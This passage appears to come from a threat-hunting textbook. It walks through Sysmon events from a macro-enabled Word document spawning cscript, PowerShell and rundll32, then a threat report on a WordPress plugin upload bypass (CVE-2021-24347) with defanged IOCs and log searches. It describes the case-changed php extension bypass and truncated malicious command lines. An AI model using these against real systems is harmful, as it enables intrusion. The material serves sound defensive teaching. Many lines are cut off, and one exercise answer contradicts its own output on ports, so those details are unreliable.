We need to answer the question, how did the file make it to the folder? Let us add a new task to our to-do list: find out how the file critical_list.doc made it to DESKTOP-PC01 and if it made it to other machines and continue analyzing the eight Sysmon events we received from our search.
The next event of interest from the eight events is the third one, shown hereafter.
Listing 3.8 Sysmon Event Containing winword.exe - Third Event
{
  "@timestamp": "2021-11-21T13:02:20.000Z",
  "_raw": {
    "Channel": "Microsoft-Windows-Sysmon/Operational",     "CommandLine": ""C:\Program Files\Microsoft Office\Office14\WI
    "Company": "Microsoft Corporation",
    "Computer": "DESKTOP-PC01",
    "CurrentDirectory": "C:\Program Files\Microsoft Office\Office1
    "Description": "Microsoft Word",     "EventID": "1",
...
    "Image": "C:\Program Files\Microsoft Office\Office14\WINWORD.E
...
    "OriginalFileName": "WinWord.exe",
    "ParentCommandLine": ""C:\Program Files\Microsoft Office\Offic
    "ParentImage": "C:\Program Files\Microsoft Office\Office14\WIN
    "ParentProcessGuid": "{10cf5a0f-4359-619a-1402-000000000700}",
    "ParentProcessId": "5756",
    "ParentUser": "DESKTOP-PC01\pc01-user",
    "ProcessGuid": "{10cf5a0f-435b-619a-1602-000000000700}",
    "ProcessID": "1872",
    "Product": "Microsoft Office 2010",
    "SystemTime": "2021-11-21T13:02:20.004354100Z",
    "Task": "1",
    "TerminalSessionId": "1",
    "ThreadID": "3648",
    "User": "DESKTOP-PC01\pc01-user",
    "UserID": "S-1-5-18",
    "UtcTime": "2021-11-21 13:02:19.949",
    "Version": "5"
  },   ...
}
The interesting field in this Sysmon event is CommandLine, which shows the use of the /Embedding option with winword.exe. This indicates that macros were enabled after opening the Microsoft Word document critical_list.doc. These macros might include malicious instructions hidden with the code contained in the macros.
Let us take note of the event timestamp "UtcTime": "2021-11-21 13:02:19.949" and update the timeline.
Figure 3.5 Threat Execution Timeline

The next event of interest from the eight events is the seventh one, shown hereafter.
Listing 3.9 Sysmon Event Containing winword.exe - Seventh Event
{
  "@timestamp": "2021-11-21T13:02:25.000Z",
  "_raw": {
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "DESKTOP-PC01",
    "Details": "Binary Data",     "EventID": "13",
...
    "Image": "C:\Program Files\Microsoft Office\Office14\WINWORD.E
    "Keywords": "0x8000000000000000",
    "Level": "4",
    "Name": "Microsoft-Windows-Sysmon",
    "Opcode": "0",
    "ProcessGuid": "{10cf5a0f-4359-619a-1402-000000000700}",
    "ProcessID": "1872",
    "RuleName": "Context,ProtectedModeExitOrMacrosUsed",
    "SystemTime": "2021-11-21T13:02:25.194072300Z",     "TargetObject": "HKU\S-1-5-21-789985733-1868513186-3804096106-
    "Task": "13",
    "ThreadID": "3648",
    "User": "DESKTOP-PC01\pc01-user",
    "UserID": "S-1-5-18",
    "UtcTime": "2021-11-21 13:02:25.188",
    "Version": "2"
  },
...
}
This is a "registry create" Sysmon event, "EventID": "13". The interesting field in this Sysmon event is TargetObject. This registry key contains a list of Microsoft Word document file locations for which a user has explicitly enabled editing and macros.
Take a note of the event timestamp "UtcTime": "2021-11-21 13:02:25.188" and update the timeline.
Figure 3.6 Threat Execution Timeline

Let us pause for a second and highlight the fact that we were able to gain this insight without access to the content of the files. The hunter has access to an important data source type, Sysmon, which describes activities performed on a system. We will cover Sysmon in more detail later in the chapter.
Let us also recall the two pending tasks in our to-do list:
1. Search for events containing www.txt and find when what process created the file and when.
2. Find out how did the file critical_list.doc make it to DESKTOP-PC01 and if it made it to other machines
Let us complete the first task in the to-do list and run the following search.
Listing 3.10 Free Text Search for www.txt in Sysmon Events
DESKTOP-PC01 AND
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" AND
/www.txt/i
| table([_raw.UtcTime, host.name, _raw.EventID, _raw.CommandLine, 
The search returns seven Sysmon events, all of which are interesting. However, none is related to creating the file www.txt. Why? The answer to this question lies in the Sysmon configuration file used, which does not capture file creation Sysmon events for files of extensions txt. The hunter should be made aware of this information. Otherwise, the hunter would discover it when conducting threat hunting expeditions that would require researching file creation activities that involve txt files.
Important fields from the seven Sysmon events are summarized hereafter, noting that the second event is the one that we captured earlier.
Listing 3.11 Event 1
_raw.UtcTime->2021-11-21 13:02:41.156,  host.name->DESKTOP-PC01,
_raw.EventID->1,
_raw.CommandLine->"C:\Windows\System32\cscript.exe" C:\Users\pc01-
_raw.ParentCommandLine->"C:\Program Files\Microsoft Office\Office1
This event shows that winword.exe executing cscript.exe. This event relates to a previous event we have seen in which the cscript.exe CommandLine contained in this event was the ParentCommandLine for powershell.
Listing 3.12 Event 2
_raw.UtcTime->2021-11-21 13:02:43.152, host.name->DESKTOP-PC01,
_raw.EventID->1,
_raw.CommandLine->"C:\Windows\System32\WindowsPowerShell\v1.0\powe _raw.ParentCommandLine->"C:\Windows\System32\cscript.exe" C:\Users
This event shows that powershell.exe was executed by cscript.exe. We have seen this event earlier.
Listing 3.13 Event 3
_raw.UtcTime->2021-11-21 13:02:54.219, host.name->DESKTOP-PC01,
_raw.EventID->1,
_raw.CommandLine->"C:\Windows\System32\cmd.exe" /c rundll32.exe C:
_raw.ParentCommandLine->"C:\Windows\System32\cscript.exe" C:\Users
This event shows cmd.exe spawned by cscript.exe. The command-line shell executes rundll32.exe, which tries to load and run programs held in a DLL, www1.dll, located in the ProgramData folder. How did www1.dll make it to the endpoint? Let us add a task to our to-do list: find out how did the file www1.dll make it to the endpoint.
Listing 3.14 Event 4
_raw.UtcTime->2021-11-21 13:02:54.263, host.name->DESKTOP-PC01,
_raw.EventID->1,
_raw.CommandLine->"C:\Windows\System32\cmd.exe" /c rundll32.exe C:
_raw.ParentCommandLine->"C:\Windows\System32\cscript.exe" C:\Users This is similar to event 4, but rundll32.exe tries to run www2.dll instead.
Listing 3.15 Event 5
_raw.UtcTime->2021-11-21 13:02:54.424, host.name->DESKTOP-PC01,
_raw.EventID->1,
_raw.CommandLine->"C:\Windows\System32\cmd.exe" /c rundll32.exe C:
_raw.ParentCommandLine->"C:\Windows\System32\cscript.exe" C:\Users This is similar to event 4, but rundll32.exe tries to run www3.dll instead.
Listing 3.16 Event 6
_raw.UtcTime->2021-11-21 13:02:54.625,
host.name->DESKTOP-PC01,
_raw.EventID->1,
_raw.CommandLine->"C:\Windows\System32\cmd.exe" /c rundll32.exe C:
_raw.ParentCommandLine->"C:\Windows\System32\cscript.exe" C:\Users This is similar to event 4, but rundll32.exe tries to run www4.dll instead.
Listing 3.17 Event 7
_raw.UtcTime->2021-11-21 13:02:54.861, host.name->DESKTOP-PC01, _raw.EventID->1,
_raw.CommandLine->"C:\Windows\System32\cmd.exe" /c rundll32.exe C:
_raw.ParentCommandLine->"C:\Windows\System32\cscript.exe" C:\Users
This is similar to event 4, but rundll32.exe tries to run www5.dll instead.
It is time to update the timeline before continuing the search.
Figure 3.7 Threat Execution Timeline

Let us now address task 3: find out how did the file www1.dll make it to the machine. The same question applies to the rest of the DLL files. Let us search for Sysmon file creation events containing any of the DLL filenames.
Listing 3.18 Free Text Search for the DLL files in Sysmon Events
DESKTOP-PC01 AND
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" AND
_raw.EventID=13 AND
/www[1-5].dll/i
Running the search does not generate matching events. Similar to files with txt extension, the Sysmon configuration file used, which does not capture file creation Sysmon events for files with extension dll. The following, taken from the Sysmon configuration file used shows that Sysmon file creation events are generated for files with a ps1 extension.
Listing 3.19 Sysmon Configuration for files with extension .ps1
<RuleGroup name="" groupRelation="or">
<FileCreate onmatch="include">
<TargetFilename condition="end with">.ps1</TargetFilename> <!--Pow
By now, we have uncovered a significant amount of evidence that shows a single machine has been compromised, proving the threat hunt hypothesis. We can go ahead and open an incident case, provide the information about the findings, and assign the ticket to the incident response team, which can take it from here. We could have opened a ticket at an earlier stage of the hunt and continued hunting and updating the case while we tried to reveal more evidence about the threat execution. Deciding on when to open a ticket can be based on several factors. These include the severity of the threat execution, the value of the assets impacted, and how confident the threat hunter is about the actual threat execution. You do not want to open a ticket very early or very late.
In the ticket, the threat hunter can ask the incident response team for more information about the content of files created on the system, ex. www.ps1 and www.txt. In addition, the hunter would also be keen to get a copy of the sandboxing report for critical_list.doc.
Now that we have concluded our first hunting expedition, let us visit the threat hunting process to find out how we progressed from one stage to another and the steps we took in every stage.
3.2 Threat hunting process
The process has three phases: preparation, execution, and communication. Let us trace the process, starting with the preparation phase and highlighting the steps we went through.
3.2.1 Preparation
The following are the steps that we took to prepare for the hunt, also shown in Figure 3.8:
1. The trigger for the threat hunt was the information shared by the red team.
2. The hunter decided to create a new hunt play.
3. The hunter followed the standard hunt play template shared in Chapter 2 and shown later in this section.
4. For the hunt, Sysmon was the main data source type and Sysmon events were collected from endpoints.
5. Sysmon events were collected and stored on a data store, Humio.
6. The threat hunter was able to access the data store and search the Sysmon events using the Humio web interface. The performance of the searches was adequate.
Figure 3.8 Threat Hunting Process - Preparation Phase

As part of the preparation phase, the hunter creates the threat hunt play document.
Threat hunt play
 Title: Hunt for malicious processes spawning by or through Microsoft
Office
 Reference Number: Hunt-Play-Win-01
 Background: An external red team hired by the organization was able to bypass security prevention and detection controls deployed. The red team crafted a Microsoft Word document with a suspicious payload and then attached the document to an email they sent to users. Opening the document executes the payload automatically. The code contained in the payload can bypass the existing security controls on the users' machines running Windows 10, going undetected by the anti-virus software. In addition, other security monitoring tools deployed did not generate security alerts for the SOC team to respond to.
 Hypothesis: We hypothesize that an attacker has successfully spearphised users to download and open a Microsoft Office Word document. Opening the Microsoft Word document resulted in executing malicious code that allowed the attacker to compromise the endsystem's security.
Scope: The scope of the hunt covers all Microsoft endpoints
Threat Technique: Crafting a well-structured spearphishing email that entices users to click an embedded link and download the malicious Microsoft Word document. The activity maps to MITRE ATT@CK subtechnique T1566.002 "Phishing: Spearphishing Link."  Procedure: email sent with a link contained in the email to download a Microsoft Office document.
     Data sources and events: Windows Sysmon events Threat Technique: Microsoft Office Word spawning a Windows command shell (cmd). The activity maps to MITRE ATT@CK subtechnique T1059.003 "Command and Scripting Interpreter: Windows
Command Shell."
Procedure: Microsoft Office spawning a command line shell.
Data sources and events: Windows Sysmon events
Threat Technique: Microsoft Office Word spawning PowerShell or creating PowerShell script files that get executed. The activity maps to
MITRE ATT@CK sub-technique T1059.001 "Command and Scripting
Interpreter: PowerShell."
 Procedure: Microsoft Office spawning PowerShell or creating a PowerShell script file of extension ps1.
     Data sources and events: Windows Sysmon events References:
MITRE ATT&CK Command and Scripting Interpreter: Windows Command Shell, T1059.003
(https://attack.mitre.org/techniques/T1059/003)
 MITRE ATT&CK Command and Scripting Interpreter:
PowerShell, T1059.003
(https://attack.mitre.org/techniques/T1059/001)
 MITRE ATT&CK Phishing: Spearphishing Link, T1566.002
(https://attack.mitre.org/techniques/T1566/002)
Let us move to the next phase, execution, which the chapter so far was mostly about.
3.2.2 Execution
The following are the steps that we took to prepare for the hunt, also shown in Figure 3.9:
1. We started with an initial set of searches that translate the procedures identified in the planning phase. Some of the searches did not generate any results, others did.
2. Based on the evidence collected, we proved the hypothesis.
3. At one stage of the threat hunting expedition, we opened a new security incident case and assigned it to the incident response team.
4. We briefly explored if the threat has extended to other systems, but that brief exploration did not result in any finding. Only one endpoint was impacted. In the coming chapters, we will perform a deeper investigation to understand the scope of the threat execution.
Figure 3.9 Threat Hunting Process - Execution Phase

Now we created a case and assigned it to the incident response team, let us move to the last phase, communication.
3.2.3 Communication
Based on the information collected during the threat hunt, the threat hunter can propose new security motoring rules and share the TTPs uncovered during the exposition with the threat intelligence. This is shown in Figure 3.10. We will provide more insights and examples of the communication phase, including the threat hunting expedition report in the coming chapters.
Figure 3.10 Threat Hunting Process - Communication Phase

As we conclude our first threat hunt, a number of questions that come to mind include:
 Would it be possible to automate some of the searches that we performed in this expedition? For example, after finding an initial clue, can we automate the searches that connect previous and future events without running separate searches. Doing this will save time and effort.  We did not have visibility on the spearphishing email activity due to the lack of events. How can we gain access to related events for future hunting expeditions?
 We could not locate some Sysmon events during our searches because Sysmon configuration on endpoints did not capture them in the first place. Should we ask the system administrator to apply changes to the Sysmon configuration file? How much effort and what impact would that have on endpoints, data stores, and the network?
Addressing the above questions would help you optimize the time and coverage of your future hunting expeditions. We will address those questions in the coming chapters.
In this hunting expedition, we relied on a single data source type, Sysmon, which captured many of the activities we wanted to analyze. Let us provide an overview of Sysmon.
3.3 Microsoft Windows Sysmon Events
System Monitor (Sysmon) is one of the richest Windows data sources for the security monitoring team and threat hunters. It is a free tool that runs as a Windows system service and device driver and is not installed by default. When installed, Sysmon remains resident across system reboots to monitor and log system activity to the Windows event log. It is important to note that Sysmon does not provide an analysis of events.
After this short introduction to Sysmon, let us look into more details of the capabilities it provides.
3.3.1 Sysmon Capabilities
According to Microsoft, Sysmon includes the following capabilities:
 Logs process creation with full command line for both current and parent processes.
 Records the hash of process image files using SHA1 (the default), MD5, SHA256 or IMPHASH.
Multiple hashes can be used at the same time.
Includes a process GUID in process create events to allow for correlation of events even when Windows reuses process IDs.
 Includes a session GUID in each event to allow correlation of events on the same logon session.
Logs loading of drivers or DLLs with their signatures and hashes.
Logs open for raw read access of disks and volumes.
 Optionally logs network connections, including each connection's source process, IP addresses, port numbers, hostnames and port names.  Detects changes in file creation time to understand when a file was really created. Modification of file create timestamps is a technique commonly used by malware to cover its tracks.
Automatically reload configuration if changed in the registry.
Rule filtering to include or exclude certain events dynamically. Generates events from early in the boot process to capture activity made by even sophisticated kernel-mode malware.
Table 3.1 shows the Sysmon types and corresponding IDs contained on the Sysmon events.




Table 3.1 shows the extensive coverage of Sysmon, which makes it one of the best data sources for threat hunting. Using Sysmon comes at a price, however. The following is a snapshot of a sample Sysmon event of type 1 (process creation). The Sysmon events are XML-formatted and are relatively large, resulting in disk and license consumption when collected by SIEM tools.
For example, the size of the below event is around 2KBytes. A server with Sysmon installed can generate large volume Sysmon events depending on the system activities and the Sysmon configuration applied.
An organization might have hundreds or thousands of Windows servers. Sysmon events would be forwarded to a data store where they can be consumed for security monitoring and threat hunting purposes. Depending on the data store technology, collecting and storing Sysmon events from these servers would require a large amount of storage and consume a significant license.
When installing Sysmon, consider using a configuration file that captures the most important and relevant events for security monitoring and hunting purposes. For example, Sysmon does not collect network monitoring events when installed using the default configuration file. Applying custom Sysmon configuration files allows you to filter unnecessary events, reducing the number of events captured by Sysmon.
A good template that can be used as a baseline to build a custom Sysmon configuration file is available on SwiftOnSecurity (https://github.com/SwiftOnSecurity/sysmonconfig/blob/master/sysmonconfig-export.xml.) The SwiftOnSecurity Sysmon configuration file is continuously maintained and properly commented, describing each Sysmon event type and the logic behind discarding or including specific events. Another good repository posted here[1] contains a large number of Sysmon inclusion and exclusion filter templates.
Threat hunters should have a good understanding of Sysmon and the exact Sysmon event collection configuration used by the organization. Installing and managing the Sysmon tool is not the responsibility of the threat hunter; threat hunters should be informed and, in some cases, consulted.
The Sysmon configuration files we use for the threat hunts in the book is based on the SwiftOnSecurity template, provided in appendix.
When searching Sysmon events, you should build queries that look for relevant fields. Let us expand this topic in the next section.
3.3.2 Searching Sysmon Events
Sysmon event types contain fields that are relevant to the activity it is generated for. For example, Sysmon events of type 11 (FileCreate) contains fields such as Image and TargetFilename. These fields (Image and TargetFilename) are not available in events of type 1 (ProcessCreate) or 3 (NetworkConnect) for example.
When hunting, you would use a combination of field-based and free-text searches. In the threat hunt expedition we conducted in this chapter, we performed field-based searches (for example, searching the CommandLine field in Sysmon events of type 1). We also performed free text searches, which look at the content of the raw event in search for a matching string (for example, we searched for www.ps1 in all Sysmon events.)
Threat hunters in environments where Sysmon is used should build a solid understanding of Sysmon, its types, and the fields contained in the different event types.
This brings us towards the end of the chapter. Equipped with the knowledge you gained, let us have an exercise.
3.4 Exercise
The security incident we uncovered in the threat hunting expedition involved establishing outbound network connections to download the DLL files (www1.dll, www2.dll, www3.dll, www4.dll and www5.dll).
1. Can you find the Sysmon network connection events?
2. What process initiated the outbound network connections you uncovered in question 1?
3. What were the destination IP addresses and ports for the network connections?
4. Update the timeline to reflect the new findings.
Download the events from Chapter 3's repository on Github
(https://github.com/threat-hunt/chapter3) and upload them to your data store of choice. The Sysmon events are JSON-formatted, making them easy to parse using your tool of choice, such as Splunk, Elastic, and Humio.
Hint
Search for Sysmon events with EventID 3.
3.5 Answers To Exercise
1. Try to find the list of the outbound connections made by powershell.exe in the same time window as the suspicious activities uncovered in the threat hunting expedition. The following search can be used to list the connections by searching for Symon events with EventID 3 and that contain the string "powershell" (case insensitive). The search reveals that there were five connections in total; two connections were to a local IP address and three to Internet IP addresses.
Listing 3.20 Search command
DESKTOP-PC01 AND
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" AND
_raw.EventID=3 AND
/powershell/i
| table([_raw.UtcTime, _raw.DestinationIp, _raw.Protocol, _raw.Des
Listing 3.21 Search Output
2021-11-21 13:03:03.705 192.168.155.134 tcp
80
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
2021-11-21 13:03:04.715 192.168.155.134 tcp
80
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
2021-11-21 13:03:06.225 146.112.61.110 tcp 443
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
2021-11-21 13:03:06.792
2.20.7.24 tcp
80
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
2021-11-21 13:03:08.836 146.112.61.110 tcp 443
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
2021-11-21 13:03:10.545 146.112.61.110
tcp 443
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
2. The process
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe initiated the connections.
3. All the connections used TCP port 80. The connections were destined to the following IP addresses: a) 192.168.155[.]134
b) 2.20.7[.]24
c) 146.112.61[.]110
The following shows the PowerShell connections added to the timeline.

This brings us to the end of this chapter. This is your first hunt, so do not expect everything to be in perfect order; this is reality. What is important is keeping track of the investigation tasks and updating the timeline are crucial logistical activities in your expedition. Record the evidence you collect and track the timeline of events that helps you better visualize the threat and later help you in reporting it.
The scope of the hunt covers endpoints running Windows. The number of machines running Windows can range from few to tens of thousands or even more for very large organizations. Collecting events from a very large number of endpoints is costly in terms of licenses and infrastructure requirements. Hence, there will be cases where you might not have the luxury of collecting Sysmon events.
3.6 Summary
 Information shared from a red team exercise is one of the triggers of the threat hunting process. The input you receive from the red team would drive your research work before creating a hunt play.
 A threat hunting expedition starts by searching for clues that would drive the rest of the hunt. It might take some time to find these initial clues, so do not get frustrated.
 Searching events collected in a data store is a common activity you will perform when conducting a hunting expedition.
 Make sure you know the data sources and tools required to conduct your hunting expedition.
 Sysmon is an important data source type for security monitoring and threat hunting. It provides a significant level of visibility for activities performed on Windows endpoints.
 Sysmon can be an expensive logging option depending on the deployment scope and configuration applied.
 Threat hunting expeditions would have lots of sideway activities. Use a timeline to track your findings, and maintain a to-do list to track your activities.
 Your threat hunting skill and confidence levels will increase the more hunting expeditions you conduct and optimize how you conduct expeditions.
[1] https://github.com/olafhartong/sysmon-modular

4 Threat Intelligence for Threat Hunting
This chapter covers
The relationship between threat hunters and threat analysts
Collecting, processing, and distributing threat intelligence information Conducting a threat hunting expedition based on threat intelligence information
Working with multiple data sources during a threat hunt
Documenting and sharing new tactics, techniques, and procedures Working under pressure
In the previous chapter, we conducted a threat hunt expedition based on the red team's findings. In this chapter, we have the opportunity to work with the threat intelligence and vulnerability management teams.
We start the chapter with a scenario where you receive a threat intelligence report that would trigger the threat hunting process. You will review the structure and content of a threat intelligence report and understand the expectations from the threat hunter.
We then research the environment to understand the hunting landscape. We work on two data sources, web server access logs and public cloud firewalls. You will get the opportunity to understand the capabilities and limitations of these data sources and how they might impact your hunting expedition.
You will continuously communicate with other teams during the threat expedition, especially the system administration and threat intelligence teams.
After concluding the expedition, we map the hunting activities performed to the three phases of the threat hunting process: preparation, execution, and communication.
We list examples of recommendations that the threat hunter can propose to achieve better visibility for future hunting and investigation work.
Time to hunt for web shells. Let us jump right into it.
4.1 Preparing for the Hunt: Hunt for Web Shells
You have now completed writing the threat hunting report for the previous hunt expedition. The threat intelligence and vulnerability management teams sent you an urgent message requesting you run a threat hunt expedition. The message contained a threat intelligence report that describes the active exploitation of a recently discovered vulnerability that allows attackers to upload web shells.
The organization operates a web application that is affected by this vulnerability. In addition, the threat intelligence report provides details about one of the supplier's credentials published for sales on a dark web marketplace.
Note
Web shells are pieces of code written using the language used by the web servers. When uploaded to web servers, web shells allow remote code execution using a web interface.
Note
The dark web refers to Internet content that is not visible to search engines and inaccessible using regular browsers such as Chrome, Firefox, or others. Accessing the dark web requires using an anonymizing browser referred to as Tor. The dark web hosts marketplaces where items ranging from malware code to stolen identities are available for sale.
Note
The deep web consists of any content that lives behind paywalls, authentication forms, logins, or passwords.
Let us go through the scenario and the threat intelligence report.
4.1.1 Scenario
The threat intelligence report describes the active exploitation of a recently announced vulnerability in a WordPress plugin deployed in a self-hosted production web server the organization hosts on a public cloud service provider.
It is unknown if threat actors have exploited the vulnerability at one point in time. You are expected to conduct a threat hunt expedition to uncover evidence, if any, indicating system compromise, data exfiltration, or other breaches that resulted from the successful exploitation of the vulnerability.
According to external threat intelligence providers, threat actors have successfully exfiltrated data from several organizations, using techniques and tools described in the report.
Note: WordPress is a content management system (CMS) that allows you to build, customize and maintain websites. WordPress uses a plugin architecture and a template system to customize websites. WordPress makes extensive use of plugins, which are add-ons that can extend a WordPress website's functionality.
It is time to go through the threat intelligence that the threat intelligence team has prepared and shared.
4.1.2 Threat intelligence report
Classification: Highly confidential
TLP: Red
Publisher: Threat Intelligence Team
Threat code name: FussyTrain
Summary: This threat intelligence report resulted from efforts between the threat intelligence team, the vulnerability management team, and threat intelligence partners and providers.
 The report highlights the cyber threat associated with active actors exploiting a newly identified vulnerability, CVE-2021-24347, in the SP Project & Document Manager WordPress plugin. The national vulnerability database (NVD) associates a high Common Vulnerability Scoring System (CVSS) base score of 8.8 on a scale of 10 to the vulnerability.
 The SP Project & Document Manager WordPress plugin before 4.22 allows users to upload files. While the plugin attempts to prevent php and other similar files that could be executed on the server from being uploaded by checking the file extension. It was discovered that php files could still be uploaded by changing the file extension's case, for example, from php to pHP.
 The project management production portal hosted on a public cloud provider uses WordPress with the plugin. The portal allows authenticated and authorized staff members, external customers, and partners to collaborate and track the status of projects and facilitates the upload and exchange of project files.
 According to threat intelligence information received, threat actors are actively exploiting the newly identified vulnerability with organizations reporting incidents of successful system compromise and data exfiltration.
 Our threat vulnerability management team working with the system administrator successfully patched the system five days after the vulnerability public announcement.
 What compounds the case is that an external threat intelligence provider informed us that the credentials of a supplier account, supplier007, with access to the portal had been potentially compromised. The credentials are on sale on a dark web marketplace. An external threat intelligence provider identified the seller, RecklessGoat, as credible, indicating that the credentials on sale are legitimate. The external threat intelligence provider has not communicated or interacted with the seller. The threat intelligence team has proactively created a security incident case (ticket) to capture information collected about the potential misuse of the account. All parties involved, including the threat hunting team, should update this incident case.
 The threat intelligence team confirmed that the partner's account, supplier007, has access to one of the projects published on the public WordPress portal. The threat intelligence team has requested to disable the account with immediate effect. We have also asked to disable all accounts belonging to the supplier in question. We have not yet communicated with the supplier to inform them about disabling their access to our systems.
 It is unclear if any threat actor exploited the vulnerability at one point in time. We would like you (the threat hunter) to conduct a threat hunt expedition to uncover evidence indicating system compromise, data exfiltration, or other breaches due to the successful exploitation of the vulnerability.
 We assess that advanced persistent threat (APT) cyber actors are likely among those exploiting the vulnerability. The exploitation of the application poses a severe risk. Successful exploitation of the vulnerability allows an attacker to place web shells, which enable the adversary to conduct post-exploitation activities, such as compromising administrator credentials, conducting lateral movement, and exfiltrating information.
Technical Details:
The vulnerable version of the plugin allows users to upload files. By default, the plugin attempts to prevent php and other similar files that could be executed on the server from being uploaded by checking the file extension. However, it was discovered that php files could still be uploaded by changing the file extensions.
 Successful compromise of the application by exploiting CVE-202124347, allows the attacker to upload php web shell files to
/var/www/html/wp-content/plugins/sp-client-documentmanager, bypassing file upload security controls implemented by the WordPress plugin.
 After the initial exploitation, the web shell is accessible on /wpcontent/uploads/sp-client-document-manager. The attacker then attempts to move laterally using information harvested from the compromised system to gain access to other systems in the network.
 Confirming a successful compromise might prove difficult; attackers run clean-up scripts designed to remove traces of the initial point of compromise and hide any relationship between the vulnerability exploitation and the web shell.
Indicators of Compromise - IP addresses
188.169.199[.]59
178.175.8[.]253
216.158.226[.]206
119.59.124[.]163
59.95.67[.]172
59.96.27[.]163
59.99.198[.]133
Indicators of Compromise - Web shell URL paths
  /wp-content/uploads/sp-client-document-manager/ Tactics, Techniques and Procedures The actors have been observed using various tactics, techniques, and procedures (TTPs), including the following:
 Uploading web shells to disk for initial access, MITRE ATT&CK
T1505.003
 Obfuscating Information using Base64 encoding, MITRE
ATT&CK T1027
 Conducting further operations to dump user credentials, MITRE
ATT&CK T1003
Adding/deleting user accounts as needed, MITRE ATT&CK T1136
Deleting files to remove indicators from the host, MITRE
ATT&CK T1070.004
 Exfiltrate data over the network, , MITRE ATT&CK T1011
Now that you have gone through the threat intelligence report, let us understand the environment before planning and conducting the threat hunt expedition.
4.1.3 Research work
The following timeline shows the sequence of events:
 January 10: The system administrator created the account in question, supplier007, and provided the user access to the WordPress projects portal.
 April 10: The system administrator installed the vulnerable version of the plugin on the WordPress server
 June 2: The credentials of the account, supplier007, were posted for sale on the dark web.
June 14: The plugin vulnerability, CVE-2021-24347, was made public.
 June 18: The system administrator installed a new plugin version. June 22: The external cyber threat intelligence provider informed the threat intelligence team about a compromised account, supplier007.  June 23: The threat intelligence team shared the threat intelligence report with the threat hunter
Figure 4.1 Timeline - Sequence of events

Working closely with the threat intelligence team, the vulnerability management team, and the system administrator, you confirmed that the version of the WordPress plugin previously deployed was vulnerable. You also confirmed that the system had been patched successfully.
Your research revealed that the following events are collected and stored in the event store for one year.
 Apache2 web access events from the web server hosting the WordPress site. The events are in /var/log/apache2/access.log.
 Firewall events for inbound and outbound connections to and from the web server. The firewall rules are applied to the Virtual Private Cloud (VPC) that hosts the web server.
Note
A VPC provides a private cloud computing environment within a shared public cloud.
Your research also revealed the following:
The Apache2 web access events do not contain user identifiers.
WordPress user activities are not captured.
The WordPress application is deployed on a Kubernetes cluster hosted on the public cloud provider.
 A cloud load-balancer is provisioned to allow public access to the WordPress site using ports TCP/80 and TCP/443.
Note
Kubernetes is an open-source container orchestration platform that enables the operation of an elastic web server framework for cloud applications.
Note
Containers are packages of software that contain all of the necessary elements such as dependencies, libraries, and other binaries to run in any environment.
Note
A pod is a group of one or more containers with shared storage and network resources.
Equipped with the above information, let us start our hunt; time is of the essence.
4.2 The Hunt Expedition
Ideally, you would look into activities performed from the time the plugin was activated. In this case, the threat hunt windows will be from the 10th of April. To uncover the initial set of clues, let us start by searching events for activities identified as suspicious by the threat intelligence report and your research.
4.2.1 Searching for Malicious Uploads
We start by looking for all uploads attempts that might be suspicious. To achieve that, we first need to understand the structure and the content of the web server logs. The following is a sample web access event generated by the Apache web server and stored by default in /var/log/apache2/access.log.
Listing 4.1 Sample Raw Apache2 Web Access Event
10.76.2.1 - - [31/Dec/2021:07:05:54 +0000] "GET /wp-admin/ HTTP/1. el Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)Versi
When collected and stored on an event store, additional fields are added to the event. The following shows a web server event formatted in JSON and stored in the central event store.
Listing 4.2 Sample Apache2 Web Access Event in JSON Format
{
  "@timestamp": "2021-12-31T07:05:54.000Z",
  "date": "31/Dec/2021:07:05:54",
  "host": {
    "name": "portal"                                              
  },
  "index": "default",
  "ip": "10.76.2.1",                                              
  "length": "9637",                                               
  "path": "/wp-admin/ HTTP/1.1",                                    "remote_log_name": "-",
  "request_method": "GET",                                        
  "source": "/var/log/access.log",                                
  "sourcetype": "access_combined",                                
  "status": "200",                                                  "timezone": "+0000",
  "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) A
  "userid": "-"
}
Now that we understand the structure of web access events, let us determine
if events contain names and extensions for project files uploaded to the WordPress site using the file upload plugin. If the uploaded filenames are logged, then we expect to find them in the path field. The following search on the event store, Humio, looks for filenames in the path field in web access events.
Listing 4.3 Search Apache2 Access Events and Extract Filenames in Web Requests
sourcetype = access_combined AND                                 # | replace("HTTP\/1\.1", with="", field=path, as=path_only)       #
| regex("(?<filename>\w+\.+\w+)", field=path_only)               #
| groupby(field=filename, function=count())                      #
| sort(field=_count, type=number, order=desc)                    #
If uploaded filenames are included in events, then we expect to get an output with filenames with extensions such as docx, pdf, xlsx, etc.
The search output contains filenames extracted from the Apache web access events. The result indicates that the names of the uploaded files are not captured in the web access events. Instead, the events capture web requests made to the Apache web server, for example, requests to ajax.php and login.php.
Listing 4.4 Filenames Extracted from Apache2 Web Requests
ajax.php.         23 plan.php.         6 index.php.        5 jquery.remod      2 login.php.        2 jquery.responsive 2 ...
Although this is not great news, by now, you know that things might not work the way you expect or desire, especially when you run an expedition for a new hunt play.
Not being able to search for filenames in file upload activities drives us to look for other indicators such as web requests to the plugin upload directory, uploads/sp-client-document-manager; an indicator listed in the threat intelligence report.
Listing 4.5 Search Apache2 Access Events Containing the Plugin Upload Directory
sourcetype = access_combined  AND 
/uploads\/sp-client-document-manager/I                            
| replace("HTTP\/1\.1", with="", field=path, as=path_only)
| time := formatTime("%Y/%m/%d %H:%M:%S", field=@timestamp, timezo | table([time, status,path_only])
| sort(field=time, order=asc)                                     The search generates the following output.
Listing 4.6 Paths in Web Request Containing the Plugin Upload Directory
"time","status","path_only"
 
"2021/06/17 07:58:34","200","/wp-content/uploads/sp-client-documen  
"2021/06/17 07:58:51","200","/wp-content/uploads/sp-client-documen  
"2021/06/17 07:59:05","200","/wp-content/uploads/sp-client-documen  
"2021/06/17 07:59:30","200","/wp-content/uploads/sp-client-documen  
